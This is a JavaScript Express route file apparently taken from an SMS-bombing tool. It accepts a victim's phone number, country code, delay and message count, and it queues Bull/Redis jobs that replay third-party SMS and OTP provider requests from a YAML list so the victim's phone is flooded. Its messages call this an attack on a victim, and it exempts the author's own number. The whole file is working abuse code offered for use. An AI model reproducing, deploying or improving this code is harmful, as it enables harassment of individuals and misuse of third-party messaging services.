const express = require('express')
const router = express.Router()
const yaml = require('js-yaml')
const fs = require('fs')
const path = require('path')
const { check, validationResult } = require('express-validator')
const Queue = require('bull')
const ini = require('ini')
const axios = require('axios')

const config = ini.parse(
  fs.readFileSync(path.join(__dirname, '../../../config.ini'), 'utf-8'),
)

const queue = new Queue('my-attack-queue', {
  redis: {
    host: config.SERVER.REDIS_HOST,
    port: config.SERVER.REDIS_PORT,
    password: config.SERVER.REDIS_PASSWORD,
  },
})

const main = async (myData) => {
  await queue.add(myData)
}

queue.process(async function (job, done) {
  const myVictimPayload = job.data
  const requestListIndia = myVictimPayload.requestDataIndia
  const requestListMulti = myVictimPayload.requestDataMulti
  var successRequest = 0

  for (var myCurrentRequest of requestListIndia) {
    if (myVictimPayload.amount > successRequest) {
      console.log(`Sending SMS using : ${myCurrentRequest.name}...`)

      try {
        let response = await axios({
          method: String(myCurrentRequest.method).toLowerCase(),
          url: String(myCurrentRequest.url),
          data:
            myCurrentRequest.data == undefined || myCurrentRequest.data == null
              ? undefined
              : myCurrentRequest.data,
          headers:
            myCurrentRequest.headers == undefined ||
            myCurrentRequest.headers == null
              ? undefined
              : myCurrentRequest.headers,
          params:
            myCurrentRequest.params == undefined ||
            myCurrentRequest.params == null
              ? undefined
              : myCurrentRequest.params,
        })
        if (response.status == 200) {
          console.log(
            `SMS sent ${response.status}. Service : ${myCurrentRequest.name} Victim : ${myVictimPayload.victimPhone}`,
          )
          successRequest++
        }
      } catch (error) {
        console.log(`SMS not sent. Service : ${myCurrentRequest.name}`)
      }

      delay(myVictimPayload.delay * 1000)
    } else {
      console.log('Limit Reached.')
      break
    }
  }

  if (successRequest < myVictimPayload.amount) {
    for (var myCurrentRequest of requestListMulti) {
      if (myVictimPayload.amount > successRequest) {
        console.log(`Sending SMS using : ${myCurrentRequest.name}...`)

        try {
          let response = await axios({
            method: String(myCurrentRequest.method).toLowerCase(),
            url: String(myCurrentRequest.url),
            data:
              myCurrentRequest.data == undefined ||
              myCurrentRequest.data == null
                ? undefined
                : myCurrentRequest.data,
            headers:
              myCurrentRequest.headers == undefined ||
              myCurrentRequest.headers == null
                ? undefined
                : myCurrentRequest.headers,
            params:
              myCurrentRequest.params == undefined ||
              myCurrentRequest.params == null
                ? undefined
                : myCurrentRequest.params,
          })
          if (response.status == 200) {
            console.log(
              `SMS sent ${response.status}. Service : ${myCurrentRequest.name}, Victim : ${myVictimPayload.victimPhone}`,
            )
            successRequest++
          }
        } catch (error) {
          console.log(`SMS not sent. Service : ${myCurrentRequest.name}`)
        }

        delay(myVictimPayload.delay * 1000)
      } else {
        console.log('Limit Reached.')
        break
      }
    }
  }
  done()
})

function delay(ms) {
  const date = Date.now()
  let currentDate = null

  do {
    currentDate = Date.now()
  } while (currentDate - date < ms)
}

router.post(
  '/',
  [
    check('countryCode', "Please include victim's country code.").isLength({
      min: 1,
      max: 3,
    }),
    check('phoneNumber', "Please include victim's phone number.").isLength({
      min: 10,
      max: 10,
    }),
    check('delay', 'Please enter delay in seconds.').isInt({
      min: 3,
      max: 15,
    }),
    check('amount', 'Please specify how many messages are to be sent.').isInt({
      min: 1,
      max: 200,
    }),
  ],
  async (req, res) => {
    try {
      const errors = validationResult(req)
      if (!errors.isEmpty()) {
        res.status(400).json({
          success: false,
          status: 'Missing parameters, Please include all the details.',
          errors: errors.array(),
          timestamp: Date.now(),
        })
      } else {
        const { countryCode, phoneNumber, delay, amount } = req.body

        if (phoneNumber == config.SERVER.DADDY) {
          res.status(400).json({
            success: false,
            status: 'Achaa beta, baap ko hi bomb it up ?',
            timestamp: Date.now(),
          })
        } else {
          const my_api_string = fs
            .readFileSync(
              path.join(__dirname, '../../configuration/services.yaml'),
              'utf8',
            )
            .replaceAll('{target}', phoneNumber)
            .replaceAll('{cc}', countryCode)
          const doc = yaml.load(my_api_string)

          const indiaServices = doc['providers']['91']
          const multiPurpose = doc['providers']['multi']

          var data = {
            victimPhone: phoneNumber,
            victimCountryCode: countryCode,
            delay: delay,
            amount: amount,
            requestDataIndia: indiaServices,
            requestDataMulti: multiPurpose,
          }
          main(data)

          setTimeout(function () {
            res.status(200).json({
              success: true,
              status: 'Attack has been queued successfully.',
              timestamp: Date.now(),
            })
          }, 5000)
        }
      }
    } catch (error) {
      console.log(
        `[attackVictim] Something went wrong at our end, Please try again, ERROR : ${error}`,
      )
      res.status(500).json({
        success: false,
        status:
          '[Server Error] Something went wrong at our end, Please try again later.',
        timestamp: Date.now(),
      })
    }
  },
)

module.exports = router
